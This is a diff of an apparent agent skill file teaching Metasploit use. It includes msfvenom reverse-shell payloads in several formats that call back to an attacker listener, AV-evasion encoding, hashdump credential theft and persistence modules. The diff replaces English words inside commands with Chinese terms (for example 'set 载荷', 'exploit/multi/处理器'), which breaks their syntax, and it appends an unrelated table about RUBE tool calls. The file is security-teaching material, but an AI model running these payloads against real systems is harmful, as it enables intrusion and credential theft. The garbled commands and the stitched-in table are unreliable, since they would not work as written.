@@ -16,7 +16,7 @@ date_added: "2026-02-27"
 
 ## 目的
 
-Leverage the Metasploit Framework for comprehensive penetration testing, from initial exploitation through post-exploitation activities. Metasploit provides a unified platform for vulnerability exploitation, payload generation, auxiliary scanning, and maintaining access to compromised systems during authorized security assessments.
+Leverage the Metasploit Framework for comprehensive penetration testing, from initial exploitation through post-exploitation activities. Metasploit provides a unified platform for vulnerability exploitation, 载荷 generation, auxiliary scanning, and maintaining access to compromised systems during authorized security assessments.
 
 ## 前提条件
 
@@ -29,7 +29,7 @@ msfconsole --version
 
 Installation varies by operating system and package source. Follow your platform's documented package-manager or vendor installation process before using this skill. Do not rely on an unpinned remote installer script from inside this skill.
 
-If you want database-backed features such as workspace tracking, initialize `msfdb` using the instructions for your local installation. This skill assumes Metasploit is already available and does not require `sudo`, `systemctl`, or other privileged host-level setup steps.
+If you want database-backed features such as workspace tracking, initialize `msfdb` using the instructions for your local installation. This skill assumes Metasploit is already available and does not require `sudo`, `systemctl`, or other privileged host-level 设置 steps.
 
 ### Required Knowledge
 - Network and system fundamentals
@@ -38,16 +38,16 @@ If you want database-backed features such as workspace tracking, initialize `msf
 - Target enumeration techniques
 
 ### Required Access
-- Written authorization for testing
+- Written 授权 for testing
 - Network access to target systems
 - Understanding of scope and rules of engagement
 
-Before running exploit modules, ask the user to confirm the exact target host, scope, and authorization state.
+Before running exploit modules, ask the user to confirm the exact target host, scope, and 授权 state.
 
 ## Outputs and Deliverables
 
 1. **Exploitation Evidence** - Screenshots and logs of successful compromises
-2. **Session Logs** - Command history and extracted data
+2. **会话 Logs** - Command history and extracted data
 3. **Vulnerability Mapping** - Exploited vulnerabilities with CVE references
 4. **Post-Exploitation Artifacts** - Credentials, files, and system information
 
@@ -85,9 +85,9 @@ Understand the different module categories:
 msf6 > show exploits
 msf6 > use exploit/windows/smb/ms17_010_eternalblue
 
-# 2. Payload Modules - Code executed after exploitation
+# 2. 载荷 Modules - Code executed after exploitation
 msf6 > show payloads
-msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 > set 载荷 windows/x64/meterpreter/reverse_tcp
 
 # 3. Auxiliary Modules - Scanning, fuzzing, enumeration
 msf6 > show auxiliary
@@ -101,7 +101,7 @@ msf6 > use post/windows/gather/hashdump
 msf6 > show encoders
 msf6 > set ENCODER x86/shikata_ga_nai
 
-# 6. Nops - No-operation padding for buffer overflows
+# 6. Nops - No-操作 padding for buffer overflows
 msf6 > show nops
 
 # 7. Evasion - Bypass security controls
@@ -125,7 +125,7 @@ msf6 > search platform:windows type:exploit
 # Search by type and keyword
 msf6 > search type:auxiliary smb
 
-# Filter by rank (excellent, great, good, normal, average, low, manual)
+# 过滤器 by rank (excellent, great, good, normal, average, low, manual)
 msf6 > search rank:excellent
 
 # Combined search
@@ -155,8 +155,8 @@ msf6 exploit(...) > set RPORT 445
 # View compatible payloads
 msf6 exploit(...) > show payloads
 
-# Set payload
-msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+# Set 载荷
+msf6 exploit(...) > set 载荷 windows/x64/meterpreter/reverse_tcp
 
 # Set local host for reverse connection
 msf6 exploit(...) > set LHOST 192.168.1.50
@@ -174,25 +174,25 @@ msf6 exploit(...) > exploit
 msf6 exploit(...) > run
 ```
 
-### Phase 5: Payload Types
+### Phase 5: 载荷 Types
 
-Select appropriate payload for the situation:
+Select appropriate 载荷 for the situation:
 
 ```bash
 # Singles - Self-contained, no staging
 windows/shell_reverse_tcp
 linux/x86/shell_bind_tcp
 
-# Stagers - Small payload that downloads larger stage
+# Stagers - Small 载荷 that downloads larger stage
 windows/meterpreter/reverse_tcp
 linux/x86/meterpreter/bind_tcp
 
 # Stages - Downloaded by stager, provides full functionality
 # Meterpreter, VNC, shell
 
-# Payload naming convention:
+# 载荷 naming convention:
 # [platform]/[architecture]/[payload_type]/[connection_type]
-# Examples:
+# 示例:
 windows/x64/meterpreter/reverse_tcp
 linux/x86/shell/bind_tcp
 php/meterpreter/reverse_tcp
@@ -200,7 +200,7 @@ java/meterpreter/reverse_https
 android/meterpreter/reverse_tcp
 ```
 
-### Phase 6: Meterpreter Session
+### Phase 6: Meterpreter 会话
 
 Work with Meterpreter post-exploitation:
 
@@ -251,7 +251,7 @@ C:\Windows\system32> whoami
 C:\Windows\system32> exit
 meterpreter >
 
-# Background Session
+# Background 会话
 meterpreter > background
 msf6 exploit(...) > sessions -l
 msf6 exploit(...) > sessions -i 1
@@ -304,9 +304,9 @@ Run post modules on active sessions:
 # List sessions
 msf6 > sessions -l
 
-# Run post module on specific session
+# Run post module on specific 会话
 msf6 > use post/windows/gather/hashdump
-msf6 post(windows/gather/hashdump) > set SESSION 1
+msf6 post(windows/gather/hashdump) > set 会话 1
 msf6 post(...) > run
 
 # Or run directly from Meterpreter
@@ -337,7 +337,7 @@ post/linux/manage/sshkey_persistence
 post/multi/manage/autoroute
 ```
 
-### Phase 9: Payload Generation with msfvenom
+### Phase 9: 载荷 Generation with msfvenom
 
 Create standalone payloads:
 
@@ -354,7 +354,7 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o 
 # Python reverse shell
 msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py
 
-# PowerShell payload
+# PowerShell 载荷
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1
 
 # ASP web shell
@@ -366,7 +366,7 @@ msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o
 # Android APK
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.apk
 
-# Encoded payload (evade AV)
+# Encoded 载荷 (evade AV)
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
 
 # List available formats
@@ -381,24 +381,32 @@ msfvenom --list encoders
 Configure listener for incoming connections:
 
 ```bash
-# Manual handler setup
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST 192.168.1.50
-msf6 exploit(multi/handler) > set LPORT 4444
-msf6 exploit(multi/handler) > exploit -j
+# Manual 处理器 设置
+msf6 > use exploit/multi/处理器
+msf6 exploit(multi/处理器) > set 载荷 windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/处理器) > set LHOST 192.168.1.50
+msf6 exploit(multi/处理器) > set LPORT 4444
+msf6 exploit(multi/处理器) > exploit -j
 
 # The -j flag runs as background job
 msf6 > jobs -l
 
-# When payload executes on target, session opens
-[*] Meterpreter session 1 opened
+# When 载荷 executes on target, 会话 opens
+[*] Meterpreter 会话 1 opened
 
-# Interact with session
+# Interact with 会话
 msf6 > sessions -i 1
 ```
 
 ## 快速参考
+
+| 操作 | 方法 |
+|---|---|
+| 发现工具 | 调用 `RUBE_SEARCH_TOOLS` |
+| 检查连接 | 调用 `RUBE_MANAGE_CONNECTIONS` |
+| 执行工具 | 调用 `RUBE_MULTI_EXECUTE_TOOL` |
+| 处理分页 | 检查响应中的 `cursor` 字段 |
+| 错误处理 | 验证连接状态和架构合规性 |
 
 ### Essential MSFConsole Commands
 
